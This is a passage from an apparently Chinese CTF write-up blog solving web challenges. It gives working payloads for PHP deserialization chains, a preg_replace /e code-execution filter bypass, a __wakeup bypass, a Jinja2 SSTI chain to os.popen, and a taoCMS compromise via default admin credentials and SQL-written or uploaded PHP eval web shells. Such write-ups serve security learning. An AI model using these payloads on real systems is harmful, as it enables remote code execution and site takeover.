class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{<span class="hljs-comment">//当读取不可访问的属性的值时调用</span><br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    }  <br>}<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'payload'</span>]))<span class="hljs-comment">//简单的传参</span><br>{<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'payload'</span>]);<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>很简单的序列化题，结合上述对代码的分析我们可以构造如下链子：</p>
<p>首先看准敏感函数include，这里肯定是用来读取php文件的，那这个函数肯定是我们的目标，那么我们想要调用invoke，就需要A对象被当做一个函数去调用，那我们可以找到D类中的<code>return $function();</code>符合我们的要求。</p>
<p>那想要调用其所在的get函数，就需要读取一个不可访问的属性，那我们又可以看到<code>return $this-&gt;z-&gt;var;</code>很明显如果我们令z指向对象D，那z-&gt;var相当于D-&gt;var，但很显然D中没有var属性，那便成功调用get函数了。</p>
<p>那我们想要调用其所在的tostring函数，就需要当一个类被当做字符串时会调用，那我们又可以发现wakeup里面的正则匹配，其中<code>$this-&gt;q</code>被认作字符串，那完全可以将q赋值为C类，即可走通链子。</p>
<p>至于wakeup的调用，反序列化的时候就会被自动调用，我们不必考虑。那么poc如下：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//highlight_file(__FILE__);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var_1</span>;<br><br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$q</span>;<br><br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$z</span>;<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>}<br><span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$poc</span>-&gt;q = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();<br><span class="hljs-variable">$poc</span>-&gt;q-&gt;z=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">D</span>();<br><span class="hljs-variable">$poc</span>-&gt;q-&gt;z-&gt;p=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$poc</span>-&gt;q-&gt;z-&gt;p-&gt;var_1=<span class="hljs-string">'php://filter/convert.base64-encode/resource=flag.php'</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="image-20231002180702598.png" alt="image-20231002180702598"></p>
<p><img src="image-20231002180723398.png" alt="image-20231002180723398"></p>
<p>直接base64解码即可</p>
<p><img src="image-20231002180737123.png" alt="image-20231002180737123"></p>
<p>得到flag</p>
<h3 id="WEEK1-ezphp">[WEEK1]ezphp</h3>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'code'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'pattern'</span>]))<br>{<br>    <span class="hljs-variable">$pattern</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'pattern'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\`|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\/| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%/i"</span>,<span class="hljs-variable">$code</span>))<br>    {<br>        <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'code'</span>];<br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/('</span> . <span class="hljs-variable">$pattern</span> . <span class="hljs-string">')/ei'</span>,<span class="hljs-string">'print_r("\\1")'</span>, <span class="hljs-variable">$code</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"you are smart"</span>;<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"try again"</span>);<br>    }<br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">"it is begin"</span>);<br>}<br><span class="hljs-meta">?&gt;</span><br>it is begin<br></code></pre></td></tr></tbody></table></figure>
<p>一看到这过滤的真的是吓到我了，但往往这么可怕的情况下就会有bug，我们查看一番发现，竟然没过滤</p>
<p>passthru()函数，好好好这么玩是吧~~~</p>
<p>这个函数与system类似，用法也一致。重点是</p>
<p><code> preg_replace('/(' . $pattern . ')/ei','print_r("\\1")', $code);</code>此处的代码我们如何看懂</p>
<p>我这里也是看不懂，于是选择网上冲浪看看有机会没有，结果还真有类似的^_^，下面我就跟着那些佬的思路学习一下。</p>
<p>先介绍一个PHP特性吧：</p>
<p>php自身在解析请求的时候，如果参数名字中包含空格、.、[等字符，会将他们转换成_。</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="image-20231002181255572.png" alt="image-20231002181255572"></p>
<p>首先我们知道 preg_replace 的 /e 修正符会将 replacement 参数当作 php 代码，并且以 eval 函数的方式执行，前提是 subject 中有 pattern 的匹配。</p>
<p>既然是这样我们看一张图。</p>
<p><img src="image-20231002181321001.png" alt="image-20231002181321001"></p>
<p>图中实际上通过 eval 执行的是 strtolower 函数。分别实际执行的是：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-string">"JUST TEST"</span>);<br><br><span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-string">"PHPINFO()"</span>);<br><br><span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-string">"<span class="hljs-subst">{${PHPINFO()}</span>}"</span>);<br></code></pre></td></tr></tbody></table></figure>
<p>第三个之所以可以执行代码，是因为我们通过复杂(花括号)语法的方式来让其代码执行。</p>
<p>然后在看：<code>这里的 replacement 是 strtolower(“\\1”) ，着重理解一下 \\1 。</code></p>
<p>\\1 在正则中存在自己的作用，其实就是匹配第一项</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">这里给出例子<br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/('</span> . <span class="hljs-variable">$regex</span> . <span class="hljs-string">')/ei'</span>, <span class="hljs-string">'strtolower("\\1")'</span>, <span class="hljs-variable">$value</span>);<br> <br>regex是我们的参数值 即 get的名称  value是传入的参数<br> <br>.*=<span class="hljs-title function_ invoke__">phpinfo</span>()<br> <br>所以就变为了<br> <br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/(.*)/ei'</span>, <span class="hljs-string">'strtolower("\\1")'</span>,<span class="hljs-title function_ invoke__">phpinfo</span>());<br>但这里无法执行<span class="hljs-title function_ invoke__">phpinfo</span>()<br></code></pre></td></tr></tbody></table></figure>
<p>要变为：<code>{${phpinfo()}}</code>，首先要知道</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=hello<br><span class="hljs-variable">$$a</span>=world   <br>这里相当于 <br><span class="hljs-variable">$hello</span>=world<br>所以<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span> <span class="hljs-variable">$hello</span> 为：hello world<br></code></pre></td></tr></tbody></table></figure>
<p>我们接着理解一下</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">${<span class="hljs-title function_ invoke__">phpinfo</span>()}<br> <br>执行完会变为 ${<span class="hljs-number">1</span>} 因为 <span class="hljs-title function_ invoke__">phpinfo</span>()通过var_dump返回的是<span class="hljs-number">1</span><br> <br>所以strtolower 变为 <span class="hljs-title function_ invoke__">strtolower</span>({${<span class="hljs-number">1</span>}})<br> <br>接着变为 <span class="hljs-title function_ invoke__">strtolower</span>({<span class="hljs-literal">null</span>}) <br></code></pre></td></tr></tbody></table></figure>
<p>但似乎后面的对strtolower的解释无关紧要，我认为之主要注意通过${}来解析phpinfo()，否则无法进行命令执行</p>
<p>但有注意到PHP的特性会将.这类特殊符号转化为_，因此那些佬就换为了\S*（我不了解正则表达式，因此问了GPT）发现他俩作用在这里是相通的，不过某些细节不一致罢了</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/(.*)/: <br>这部分正则表达式匹配整个输入字符串，并捕获它到一个分组中。 .* 匹配任意字符（除了换行符 \n），.* 的括号 ( ) 将匹配的内容捕获到一个分组中，以后可以在替换中使用。<br><br>(\S*)：这个部分表示匹配零个或多个非空白字符（非空格、非制表符、非换行符等），并将其捕获到分组中。<br></code></pre></td></tr></tbody></table></figure>
<p>然后我们就可以想到构造如下payload：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GET：code={${passthru(ls)}}<br>POST：pattern=\S*<br></code></pre></td></tr></tbody></table></figure>
<p>不过考虑到过滤的很多，我就将其换为了ASCII码值来替换，脚本如下</p>
<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 输入字符串</span><br>input_str = <span class="hljs-string">"ls"</span><br><span class="hljs-comment"># 初始化一个空字符串来存储结果</span><br>output_str = <span class="hljs-string">""</span><br><br><span class="hljs-comment"># 遍历输入字符串中的每个字符</span><br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> input_str:<br>    <span class="hljs-comment"># 获取字符的 ASCII 码值，并将其转换为字符串</span><br>    ascii_value = <span class="hljs-built_in">ord</span>(char)<br><br>    <span class="hljs-comment"># 格式化输出，拼接到结果字符串中</span><br>    output_str += <span class="hljs-string">f"chr(<span class="hljs-subst">{ascii_value}</span>)."</span><br><br><span class="hljs-comment"># 去除最后一个多余的点号</span><br>output_str = output_str.rstrip(<span class="hljs-string">"."</span>)<br><br><span class="hljs-comment"># 打印结果</span><br><span class="hljs-built_in">print</span>(output_str)<br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">结果为：ls-&gt;chr(108).chr(115)<br>ls /-&gt;chr(108).chr(115).chr(32).chr(47)<br>等等<br></code></pre></td></tr></tbody></table></figure>
<p>最终payload为：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">code=${passthru(chr(99).chr(97).chr(116).chr(32).chr(105).chr(110).chr(100).chr(101).chr(120).chr(46).chr(112).chr(104).chr(112))}<br><br>pattern=\S*<br></code></pre></td></tr></tbody></table></figure>
<p><img src="image-20231002184828011.png" alt="image-20231002184828011"></p>
<p>找到flag</p>
<p>但这里不懂得点为：似乎非得转换为ASCII才能执行成功</p>
<h3 id="WEEK2-no-wake-up">[WEEK2]no_wake_up</h3>
<p><img src="image-20231012181953324.png" alt="image-20231012181953324"></p>
<p>直接点击看看，简单的反序列化</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">"guest"</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">"admin"</span>){<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>        }<br>    }<br>}<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'try'</span>]); <br></code></pre></td></tr></tbody></table></figure>
<p>首先就是找敏感函数，很显然为include，这个可以产生文件包含漏洞。那我们看看如何调用该函数所在方法：destruct，这个函数会在对象被销毁的时候自动调用，并且只要满足username=admin即可。但在反序列化的时候，由于会自动调用wakeup方法而使username被赋值为guest，这样会导致username!=admin而无法调用include函数。因此我们要想办法绕过wakeup方法的调用</p>
<p>利用方式：<strong>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p>
<p>我们直接看poc来理解上句话</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>}<br><span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">flag</span>();<br><span class="hljs-variable">$poc</span>-&gt;username = <span class="hljs-string">'admin'</span>;<br><span class="hljs-variable">$poc</span>-&gt;code = <span class="hljs-string">'php://filter/convert.base64-encode/resource=flag.php'</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></tbody></table></figure>
<p>输出如下：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">"flag"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"admin"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"code"</span>;s:<span class="hljs-number">52</span>:<span class="hljs-string">"php://filter/convert.base64-encode/resource=flag.php"</span>;}<br></code></pre></td></tr></tbody></table></figure>
<p>我们只修要做如下更改，将上述的2改为其他数字即可（这里我改成了3）：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">"flag"</span>:<span class="hljs-number">3</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"admin"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"code"</span>;s:<span class="hljs-number">52</span>:<span class="hljs-string">"php://filter/convert.base64-encode/resource=flag.php"</span>;}<br></code></pre></td></tr></tbody></table></figure>
<p><img src="image-20231012182919003.png" alt="image-20231012182919003"></p>
<p>base64解码即可，如下图拿到flag</p>
<p><img src="image-20231012182934094.png" alt="image-20231012182934094"></p>
<h3 id="WEEK2-ez-ssti">[WEEK2]ez_ssti</h3>
<p><img src="image-20231012183006466.png" alt="image-20231012183006466"></p>
<p>经典页面，我们直接拼接url看看，这里我也是猜测需要get传参name，如下图</p>
<p><img src="image-20231012183155684.png" alt="image-20231012183155684"></p>
<p>发现被成功解析执行，那我们跟着常规思路一步步尝试</p>
<p>1.首先考虑拿到一个class，通过字符串、元组、列表、字典均可。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">{{<span class="hljs-string">''</span>.__class__}} 	<span class="hljs-comment">#这里我选择字符串</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="image-20231012183601848.png" alt="image-20231012183601848"></p>
<p>2.下一步目的是拿到object基类。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">{{''.__class__.__base__}}<br></code></pre></td></tr></tbody></table></figure>
<p><img src="image-20231012183629492.png" alt="image-20231012183629492"></p>
<p>3.然后获取对应子类。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">{{<span class="hljs-string">''</span>.__class__.__base__.__subclasses__()}}<br></code></pre></td></tr></tbody></table></figure>
<p><img src="image-20231012183710342.png" alt="image-20231012183710342"></p>
<p>接下来就是寻找可用的类，比如命令执行类，文件读写类等等，这里可以全局搜索或者写一个脚本来搜索</p>
<p>这里找到之后发现&lt;class ‘os._wrap_close’&gt;是位于第132个，我们直接利用即可</p>
<p>5.通过某些手段找到某个函数是可用的，下一步利用这个类的__init__函数获取到__globals__全局变量，再获取到__globals__全局变量里的__builtins__中的eval函数。</p>
<p>随后导入os模块利用popen函数进行命令执行</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?name={{''.__class__.__base__.__subclasses__()[132].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}<br></code></pre></td></tr></tbody></table></figure>
<p><img src="image-20231012185359554.png" alt="image-20231012185359554"></p>
<p>如图根目录发现flag，直接读取即可</p>
<p><img src="image-20231012185420218.png" alt="image-20231012185420218"></p>
<h3 id="WEEK2-EasyCMS">[WEEK2]EasyCMS</h3>
<p><img src="image-20231012185523040.png" alt="image-20231012185523040"></p>
<p>点开是一个网站内容管理系统叫做taoCMS，那我的思路是直接百度看看有何漏洞，尝试复现利用</p>
<p>百度之后有很多文章，不过这里我目前测试过的可以利用sql注入以及文件上传，一会儿参考文章放在下面，开始复现：</p>
<p>首先看了百度的文章发现了后台管理路径</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/admin/admin.php?action=frame&amp;ctrl=iframes<br></code></pre></td></tr></tbody></table></figure>
<p>直接访问看看</p>
<p><img src="image-20231012194936775.png" alt="image-20231012194936775"></p>
<p>发现要登录，不过这里很幸运利用网站的默认密码就进去了：admin，tao</p>
<h4 id="方法一：sql命令执行">方法一：sql命令执行</h4>
<p><img src="image-20231012195045755.png" alt="image-20231012195045755"></p>
<p>进入后台如上图会有两处利用点，一个是执行SQL，一个是文件管理。我们先看sql吧，这里没有过滤，我们直接尝试sql语句向网站中写入一句话木马文件</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> "&lt;?php @eval($_POST[1];?&gt;)" <span class="hljs-keyword">into</span> outfile <span class="hljs-string">'/var/www/html/flag.php'</span><br>或<br><span class="hljs-keyword">select</span> "&lt;?php system('cat /flag');?&gt;)" <span class="hljs-keyword">into</span> outfile <span class="hljs-string">'/var/www/html/flag.php'</span><br></code></pre></td></tr></tbody></table></figure>
<p>写入后直接url后面访问上述文件即可</p>
<p><img src="image-20231012194230363.png" alt="image-20231012194230363"></p>
<p>这里我失误了，于是又写了一个cat.php，不用在意直接拿到flag</p>
<p><img src="image-20231012194427510.png" alt="image-20231012194427510"></p>
<h4 id="方法二：文件上传">方法二：文件上传</h4>
<p>直接点击文件管理</p>
<p><img src="image-20231012195416427.png" alt="image-20231012195416427"></p>
<p>如上图，我看许多文件都会在htaccess文件中写入</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">AddType application/x-httpd-php .php3<br></code></pre></td></tr></tbody></table></figure>
<p>来确保系统会以php解析php3后缀文件，于是直接向php3文件写入一句话木马来利用</p>
<p><img src="image-20231012195607389.png" alt="image-20231012195607389"></p>
<p>但我这里写入之后访问会发现直接下载了，所以我认为这个点在这里并不能利用，不过我们直接向后台创建写入一个php木马文件即可，不需要上述那样麻烦</p>
<p><img src="image-20231012195707915.png" alt="image-20231012195707915"></p>
<p>如上图我们直接访问</p>
<p><img src="image-20231012195732948.png" alt="image-20231012195732948"></p>
<p>可以看到成功解析，后续就不再赘述了</p>
<p>上述复现可参考：<a target="_blank" rel="noopener" href="https://dhexx.cn/news/show-4839081.html?action=onClick">春秋云境：CVE-2022-23880（taoCMS v3.0.2 任意文件上传漏洞）</a></p>
<h4 id="参考文章">参考文章</h4>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64180167/article/details/132797583?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=preg_replace%20/e%20%E5%88%A9%E7%94%A8&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-132797583.142%5Ev94%5Einsert_down1&amp;spm=1018.2226.3001.4187">[BJDCTF2020]ZJCTF，不过如此 preg_replace /e模式漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/115363699">[BJDCTF2020]ZJCTF，不过如此</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_33006121/article/details/114357320?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=preg_replace">https://blog.csdn.net/weixin_33006121/article/details/114357320?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=preg_replace</a>(%27/(%27%20.%20</p>
<h3 id="WEEK2-serialize">[WEEK2]serialize</h3>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">misca</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$gao</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fei</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">miaomiao</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;gao=<span class="hljs-variable language_">$this</span>-&gt;fei;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">miaomiao</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">'Mikey Mouse~'</span>;<br>    }<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">musca</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ding</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dong</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;ding-&gt;dong;<br>    }<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">milaoshu</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">echo</span><span class="hljs-string">"misca~musca~milaoshu~~~"</span>;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;v);<br>    }<br>}<br><span 